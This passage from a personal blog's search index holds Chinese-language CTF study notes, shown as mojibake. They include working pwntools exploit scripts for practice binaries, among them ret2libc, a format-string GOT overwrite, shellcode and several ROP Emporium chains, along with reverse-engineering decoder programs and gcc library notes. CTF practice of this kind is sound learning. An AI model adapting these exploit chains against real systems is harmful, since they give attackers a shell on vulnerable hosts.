&lt;h3 id=&#34;é“¾æ¥é™æ€åº“&#34;&gt;é“¾æ¥é™æ€åº“&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -c main.c                                //åªç¼–è¯‘main.cæ–‡ä»¶
gcc -static -o prog mian.o ./libvector.a     //å°†é™æ€åº“libvector.aé“¾æ¥åˆ°main.oä¸­
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é™æ€åº“çš„è§£æè¿‡ç¨‹&#34;&gt;é™æ€åº“çš„è§£æè¿‡ç¨‹&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ar ecs libvector.a 1.o 2.o
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/BV1oS4y1T7Uf/?p=49&amp;amp;spm_id_from=pageDriver&#34;&gt;ã€CSAPP-æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‘7-5. é™æ€åº“çš„è§£æè¿‡ç¨‹_å“”å“©å“”å“©_bilibili&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;åŠ¨æ€åº“&#34;&gt;åŠ¨æ€åº“&lt;/h2&gt;
&lt;h3 id=&#34;åŠ¨æ€åº“çš„æ„é€ &#34;&gt;åŠ¨æ€åº“çš„æ„é€ &lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -fpic -o libvector.so 1.c 2.c   //-sharedæŒ‡ç¤ºåˆ›å»ºä¸€ä¸ªå…±äº«çš„ç›®æ ‡æ–‡ä»¶ï¼Œ-fpicæŒ‡ç¤ºç”Ÿæˆä½ç½®æ— å…³çš„ä»£ç (ä¸ºäº†ä½¿å…±äº«åº“å¯ä»¥åŠ åˆ°å†…å­˜çš„ä»»æ„ä½ç½®)
gcc -o prog2 main.c ./libvector.so  //ä½¿ç”¨è¿™ä¸ªåº“æ„å»ºå¯æ‰§è¡Œç¨‹åº
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;h2 id=&#34;newstarweek1&#34;&gt;NEWSTAR(week1)&lt;/h2&gt;
&lt;h3 id=&#34;random&#34;&gt;random&lt;/h3&gt;
&lt;p&gt;ç¨‹åºè¿ç”¨äº†ä¼ªéšæœºæ•°ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ctypesåº“åœ¨pythonä»£ç ä¸­è°ƒç”¨Cè¯­è¨€å‡½æ•°ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1.åˆ›å»ºä¸€ä¸ªCè¯­è¨€æºä»£ç æ–‡ä»¶ï¼Œå‡è®¾åä¸º1.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	time_t seed = time(NULL);
	srand(seed);
}
int random_number() 
{ Â  Â 
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.å°†å…¶ç¼–è¯‘ä¸ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;expå¦‚ä¸‹ï¼ˆå¯èƒ½ä¸€æ¬¡è¿‡ä¸äº†ï¼Œå¤šè¯•å‡ æ¬¡å°±è¡Œï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

#context.log_level = &#39;debug&#39;

# åŠ è½½åŠ¨æ€é“¾æ¥åº“
lib = ctypes.CDLL(&#39;./1.so&#39;)

# ç”±äºé¢˜ç›®æ˜¯åœ¨&amp;quot;2$031&amp;quot;ä¸­éšæœºç»„æˆsystemå‡½æ•°çš„å‚æ•°ï¼Œ
# æ¨æµ‹å½“å‚æ•°ä¸º$0ã€$1...æ—¶å¯ä»¥getshell,æ‰€ä»¥å¤šæ¬¡å°è¯•

sh = process(&#39;./pwn&#39;)

lib.random_number.restype = ctypes.c_int

# è°ƒç”¨Cè¯­è¨€çš„set_seedå‡½æ•°
lib.set_seed()

# è°ƒç”¨Cè¯­è¨€çš„random_numberå‡½æ•°
result = lib.random_number()

# å‘é€æˆ‘ä»¬çš„ç­”æ¡ˆ
sh.recvuntil(b&amp;quot;?\n&amp;quot;)
sh.sendline(str(result).encode(&#39;utf-8&#39;))

sh.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;shellcode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;payload = asm(shellcraft.sh())
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;newstarweek2&#34;&gt;NEWSTAR(week2)&lt;/h2&gt;
&lt;h3 id=&#34;ret2libc&#34;&gt;ret2libc&lt;/h3&gt;
&lt;p&gt;é€šè¿‡putså‡½æ•°æ³„éœ²å‡½æ•°çœŸæ­£åœ°å€ï¼Œä»è€Œæ³„éœ²libcç‰ˆæœ¬&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./ret2libc&#39;)
elf = ELF(&#39;./ret2libc&#39;)
#libc=ELF(&#39;./libc.so.6&#39;)

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x400698
pop_rdi_ret=0x400763
ret=0x4006F1

payload=b&#39;a&#39;*40+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

# é¢˜ç›®ç»™å‡ºlibcæ—¶
# libc_base Â  = puts_addr - libc.symbols[&#39;puts&#39;]
# system_addr = libc_base + libc.symbols[&#39;system&#39;]
# bin_addr Â  Â = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

# libcsearcher
# libc Â  Â  Â  Â = LibcSearcher(&amp;quot;puts&amp;quot;,puts_addr)
# libc_base Â  = puts_addr - libc.dump(&amp;quot;puts&amp;quot;)
# system_addr = libc_base + libc.dump(&amp;quot;system&amp;quot;)
# bin_addr Â  Â = libc_base + libc.dump(&amp;quot;str_bin_sh&amp;quot;)

libc_base Â  = Â  puts_addr - 0x080970
system_addr = Â  libc_base + 0x04f420
bin_addr Â  Â = Â  libc_base + 0x1b3d88

payload=b&#39;a&#39;*40+p64(pop_rdi_ret)+p64(bin_addr)+p64(ret)+p64(system_addr)
p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;moectf-2022&#34;&gt;[MoeCTF 2022]&lt;/h2&gt;
&lt;h3 id=&#34;babyfmt&#34;&gt;babyfmt&lt;/h3&gt;
&lt;p&gt;å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨fmtstr_payloadå‡½æ•°å®ç°gotè¡¨çš„æ›¿æ¢ï¼Œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=â€˜linuxâ€™,arch=â€˜i386â€™,log_level=â€˜debugâ€™)

elf=ELF(â€˜./pwnâ€™)

io.recvuntil(â€˜\nâ€™)
io.sendline(bâ€™%10$sâ€™)

system_addr=int(io.recv(10),16)

print(hex(system_addr))
printf_got = elf.got[â€œprintfâ€]

payload = fmtstr_payload(11,{printf_got:system_addr})

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;re&#34;&gt;re&lt;/h1&gt;
&lt;h2 id=&#34;flower&#34;&gt;flower&lt;/h2&gt;
&lt;p&gt;å»æ‰èŠ±æŒ‡ä»¤åå¾—åˆ°&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1706613672043.png&#34; alt=&#34;1706613672043&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è„šæœ¬å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
int main(){
	unsigned char s[] =
{
  0xD0, 0xD0, 0x85, 0x85, 0x80, 0x80, 0xC5, 0x8A, 0x93, 0x89, 
  0x92, 0x8F, 0x87, 0x88, 0x9F, 0x8F, 0xC5, 0x84, 0xD6, 0xD1, 
  0xD2, 0x82, 0xD3, 0xDE, 0x87
};
	int i;
	int len=25;
	unsigned char v5[1000];
	for ( i = 0; i &amp;lt;= 255; ++i )
    	v5[i] = ~(i ^ len);
    int j;
    for ( i = 0; i &amp;lt; len ; i++ ){
    	for(j=0;j&amp;lt;1000;j++){
    		if(s[i]==v5[j]){
    			s[i]=j;
    			break;
			}
		}
	} 	
	printf(&amp;quot;%s&amp;quot;,s);
	return 0;
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;random_1&#34;&gt;Random_1&lt;/h2&gt;
&lt;p&gt;å‘ç°æœ‰åè°ƒè¯•ï¼Œä¿®æ”¹ZFå¯„å­˜å™¨ç»•è¿‡ï¼Œåœ¨bå‡½æ•°ä¸­å‘ç°æœ‰éšæœºæ•°ç§å­ï¼Œæ˜¯ä¼ªéšæœºï¼Œç›´æ¥çˆ†ç ´ï¼Œæ³¨æ„è¦åœ¨Linuxç³»ç»Ÿä¸‹æ‰§è¡Œè„šæœ¬ï¼Œç³»ç»Ÿä¸åŒä¼ªéšæœºæ•°ä¹Ÿä¸åŒï¼Œè„šæœ¬å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;math.h&amp;gt;
unsigned char s[] =
{
  0xEE, 0xE6, 0xD7, 0xB2, 0x8A, 0xAB, 0x13, 0x35, 0x02, 0x7B, 
  0xC9, 0xB9, 0x9C, 0xBA, 0xED, 0x2E, 0xBD, 0x4F, 0xFA, 0xEE, 
  0xC8, 0xF8, 0xE4, 0x16, 0x82, 0x63, 0x3B, 0x98, 0xF4, 0x14, 
  0x30, 0x38, 0x07, 0x36, 0x84, 0x3D, 0x0C, 0x36, 0x32, 0xEA, 
  0x55, 0xA6
};
unsigned char Table[] =
{
  0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 
  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 
  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 
  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 
  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 
  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 
  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 
  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 
  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 
  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 
  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 
  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 
  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 
  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 
  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 
  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 
  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 
  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 
  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 
  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 
  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 
  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 
  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 
  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 
  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 
  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
};
int main() {
	int i,j,m;
	srand(1400333646u);
	for ( i = 0; i &amp;lt; 42; i++ ){
		int rand_num = rand();
  		for(j=0;j&amp;lt;sizeof(Table)/sizeof(Table[0]);j++){
  			if(s[i]==Table[j]){
  				for(m=0;m&amp;lt;256;m++){
  					if(s[i] == Table[(16 * ((unsigned char)(m + rand_num % 255) &amp;gt;&amp;gt; 4) + 15) &amp;amp; (unsigned char)(m + rand_num % 255)]){
  						printf(&amp;quot;%c&amp;quot;,m);
					  }
				}
			}
		}
  	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;smc&#34;&gt;SMC&lt;/h2&gt;
&lt;p&gt;å°†æœ¬è¯¥æ˜¯ä»£ç çš„æ•°æ®é€šè¿‡åŠ¨æ€è°ƒè¯•ä¿®æ”¹ä¸ºåŸæœ¬çš„ä»£ç ï¼Œäº†è§£åŠ å¯†é€»è¾‘åè„šæœ¬å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;math.h&amp;gt;
unsigned char s[] =
{
  0x7C, 0x82, 0x75, 0x7B, 0x6F, 0x47, 0x61, 0x57, 0x53, 0x25, 
  0x47, 0x53, 0x25, 0x84, 0x6A, 0x27, 0x68, 0x27, 0x67, 0x6A, 
  0x7D, 0x84, 0x7B, 0x35, 0x35, 0x48, 0x25, 0x7B, 0x7E, 0x6A, 
  0x33, 0x71
};
int main() {
	int i;
	for(i=0;i&amp;lt;32;i++){
		s[i]=s[i]-5^0x11;
	}
	printf(&amp;quot;%s&amp;quot;,s);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">å¯’å‡å­¦ä¹ </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/rop-emporium5-8/"" data-c="
          &lt;h1 id=&#34;badchars&#34;&gt;badchars&lt;/h1&gt;
&lt;p&gt;å‘ç°æœ‰å­—ç¬¦è¿‡æ»¤ï¼Œä¸å¯å‡ºç°â€™aâ€™ï¼Œâ€™gâ€™ï¼Œâ€™.â€™ï¼Œâ€™xâ€™æ‰€ä»¥å¯ä»¥é€šè¿‡å¼‚æˆ–æ“ä½œä½¿å­—ç¬¦ä¸²æ”¹å˜(é€†å‘æ—¢è§†æ„Ÿ)ï¼Œæ‰€ä»¥æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç”¨ROP&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984194157.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ„é€ exp&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./badchars&#39;)
elf = ELF(&#39;./badchars&#39;)

#gdb.attach(p)
#pause()

sem = &amp;quot;&amp;gt; &amp;quot;

p_plt = 0x400510
pop_rdi_addr = 0x4006a3
bss_addr = 0x601038
pop_r12_r13_r14_r15 = 0x40069c
pop_r15 = 0x4006a2
mov_r13_r12 = 0x400634
xor_r15_r14 = 0x400628

payload = b&#39;a&#39;*0x28 + p64(pop_r12_r13_r14_r15) + b&#39;flce,tzt&#39; + p64(bss_addr) + p64(2) + p64(bss_addr+2) + p64(mov_r13_r12) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+3) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+4) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+6) + p64(xor_r15_r14) + p64(pop_rdi_addr) + p64(bss_addr) + p64(p_plt) 
p.sendafter(sem,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fluff&#34;&gt;fluff&lt;/h1&gt;
&lt;p&gt;æ ¹æ®é¢˜ç›®æè¿°æ‰¾åˆ°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984525151.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æ˜¯æ²¡æœ‰è§è¿‡çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œç»æŸ¥è¯¢ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;xlatæŒ‡ä»¤ï¼šå°†[rbx+al]çš„å€¼èµ‹å€¼ç»™alï¼Œè¿™é‡Œçš„64ä½è§£æå‡ºæ¥gdbæ˜¾ç¤ºä¸ºxlatbï¼Œèµ‹å€¼åraxé«˜ä½ä¸å˜ã€‚ç­‰ä»·äºmov al,[rbx+al]&lt;/p&gt;
&lt;p&gt;bextræŒ‡ä»¤ï¼šbyte extractã€‚bextr dest src1 src2&lt;br&gt;
dest = (src1 &amp;gt;&amp;gt; (src2 &amp;amp; 0xFF)) &amp;amp; (1 &amp;lt;&amp;lt; ((src2 &amp;gt;&amp;gt; 8) &amp;amp; 0xFF) - 1)å³src2çš„æ¬¡ä½å­—èŠ‚è¡¨ç¤ºæå–bitä½æ•°ï¼Œæœ€ä½å­—èŠ‚è¡¨ç¤ºæå–bitä½èµ·å§‹å¤„ã€‚å°†src1æå–src2ä¸­æŒ‡å®šçš„æ¯”ç‰¹ä½å¹¶èµ‹å€¼åˆ°destä¸­ã€‚&lt;br&gt;
ä¾‹å­ï¼šbextr rbx rcx rdxï¼Œè®¾rcx = 0b10101100 01011101 00010001 11100111ï¼Œrdx = 0x0509ï¼Œ0x05æ˜¯æå–çš„å­—èŠ‚æ•°ï¼Œ0x09æ˜¯èµ·å§‹å­—èŠ‚å¤„&lt;/p&gt;
&lt;p&gt;stosbæŒ‡ä»¤ï¼šå°†alèµ‹å€¼ç»™[rdi]ã€‚ç­‰ä»·äºmov [rdi],al&lt;/p&gt;
&lt;p&gt;æ•…å¯ä»¥é€šè¿‡alå’Œrdiå°†ç›®çš„å­—ç¬¦ä¸²å†™å…¥bssæ®µä¸­ï¼Œåœ¨å†…å­˜ä¸­æ‰¾åˆ°flag.txtæ‰€å¯¹åº”å„ä¸ªå­—æ¯çš„åœ°å€,expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

p = process(&#39;./fluff&#39;)
elf = ELF(&#39;./fluff&#39;)

flag_addr = [0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8]
flag = b&amp;quot;flag.txt&amp;quot;
pop_rdi_ret = 0x4006a3
xlat_addr = 0x400628  #mov al,[al+rbx]
pop_rdx_pop_rcx_bextr = 0x40062A  #bextr rbx,rcx,rdx
stosb_addr = 0x400639  #mov [rdi],al
bss_addr = 0x601038
printf_addr = 0x400510

payload=b&#39;a&#39;*0x28
for i in range(0,8):
    payload += p64(pop_rdx_pop_rcx_bextr)
    payload += p64(0x2000)  #begin = 0x00   len = 0x20          32bits = 4bytes
    if i==0:
        payload += p64(flag_addr[i] - 0x3EF2-0xb)    #rax = 0xb
    else:
        payload += p64(flag_addr[i] - 0x3EF2 - int(flag[i - 1]))   
    payload += p64(xlat_addr) + p64(pop_rdi_ret) + p64(bss_addr+i) + p64(stosb_addr)

payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(printf_addr)

#gdb.attach(p)
#pause()

p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pivot&#34;&gt;pivot&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1705984643938.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
xchg:äº¤æ¢ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥æ”¹å˜æ ˆçš„ä½ç½®ï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªreadå‡½æ•°ï¼Œç¬¬äºŒä¸ªæ ˆæº¢å‡ºé•¿åº¦ä¸è¶³ï¼Œæ‰€ä»¥å‘ç°æ˜¯ä¸€é“æ ˆè¿ç§»çš„é¢˜ï¼Œç”¨ç¬¬ä¸€ä¸ªreadåˆ¶é€ æ ˆå¸§ï¼Œå†ç”¨ç¬¬äºŒä¸ªreadå°†æ ˆè¿ç§»åˆ°æ ˆå¸§å¤„,expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./pivot&#39;)
elf = ELF(&#39;./pivot&#39;)
lib = ELF(&#39;./libpivot.so&#39;)

pop_rax = 0x4009BB
xchg_rax_rsp = 0x4009bd
mov_rax_addr = 0x4009C0
add_rax = 0x4009C4
jmp_rax = 0x4007C1
main_addr = 0x400847

sem = b&#39;&amp;gt; &#39;

p.recvuntil(b&#39;place to pivot: 0x&#39;)
stack = int(p.recv(12).decode(), 16)
print(&amp;quot;stack = &amp;quot;,stack)

payload0 = p64(elf.plt[&#39;foothold_function&#39;]) + p64(pop_rax) + p64(elf.got[&#39;foothold_function&#39;]) + p64(mov_rax_addr) + p64(add_rax) + p64(jmp_rax)
p.sendafter(sem, payload0)
print(&amp;quot;got = &amp;quot;,elf.got[&#39;foothold_function&#39;])

payload1 = b&#39;a&#39;*0x20 + p64(lib.symbols[&#39;ret2win&#39;] - lib.symbols[&#39;foothold_function&#39;]) + p64(pop_rax) + p64(stack) + p64(xchg_rax_rsp)
p.sendafter(sem, payload1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ret2csu&#34;&gt;ret2csu&lt;/h1&gt;
&lt;p&gt;æ ¹æ®é¢˜ç›®å¯ä»¥å¾—çŸ¥æ˜¯è¿ç”¨csuæ¥ä¼ å…¥å¯„å­˜å™¨å‚æ•°ï¼Œä½†æ˜¯è¯•äº†å¥½å¤šæ¬¡éƒ½è¿‡ä¸å»ï¼Œäºæ˜¯è°ƒè¯•å‘ç°mov  edi, r13d&lt;br&gt;
å‡ºç°äº†å‘ï¼Œè€Œä¸”r12çš„åœ°å€æŒ‡å‘çš„æŒ‡ä»¤æœ€å¥½ä¸è¦å¯¹å¯„å­˜å™¨è¿›è¡Œä¿®æ”¹ï¼Œèµ·åˆæƒ³ç”¨movå’Œpopæ¥å°è¯•åˆ›é€ ä¸€ä¸ªåœ°å€ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°å¯¹å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘çš„å€¼è¿›è¡Œä¿®æ”¹çš„Gadgetsï¼Œåœ¨åŸæœ‰çš„ç¨‹åºä¸­æœ‰ä¸€ä¸ªåˆšåˆšå¥½çš„åœ°å€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984731722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŒ‡å‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984801957.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åˆšåˆšå¥½ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ­£å¸¸çš„csuæ ˆæº¢å‡ºäº†ï¼Œexpå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./ret2csu&#39;)
elf = ELF(&#39;./ret2csu&#39;)
lib = ELF(&#39;./libret2csu.so&#39;)

pop_rbx = 0x40069a
mov_rdx_r15 = 0x400680
pop_rdi = 0x4006a3
ret2win_plt = elf.plt[&#39;ret2win&#39;]
sem = b&#39;&amp;gt; &#39;

payload = b&#39;a&#39;*40 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(pop_rbx) + p64(0) + p64(1) + p64(0x4003B0) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(mov_rdx_r15) + p64(0xdeadbeef) * 7 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(ret2win_plt)

p.sendafter(sem, payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ROP emporium(5-8)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™å‘€ï¼Œå¾ˆé«˜å…´é‡è§ä½ ï¼ğŸ¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;å…³äºæœ¬ç«™&#34;&gt;ğŸ  å…³äºæœ¬ç«™&lt;/h2&gt;
&lt;p&gt;ä»…ç”¨äºå­¦ä¹ ç”¨çš„å°ç ´ç«™&lt;/p&gt;
&lt;h2 id=&#34;åšä¸»æ˜¯è°&#34;&gt;ğŸ‘¨â€ğŸ’» åšä¸»æ˜¯è°&lt;/h2&gt;
&lt;p&gt;L1u66&lt;/p&gt;
&lt;h2 id=&#34;å…´è¶£çˆ±å¥½&#34;&gt;â›¹ å…´è¶£çˆ±å¥½&lt;/h2&gt;
&lt;p&gt;pwnï¼Œé€†å‘&lt;/p&gt;
&lt;h2 id=&#34;è”ç³»æˆ‘å‘€&#34;&gt;ğŸ“¬ è”ç³»æˆ‘å‘€&lt;/h2&gt;
&lt;p&gt;QQï¼š1755733326&lt;/p&gt;
">å…³äº</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
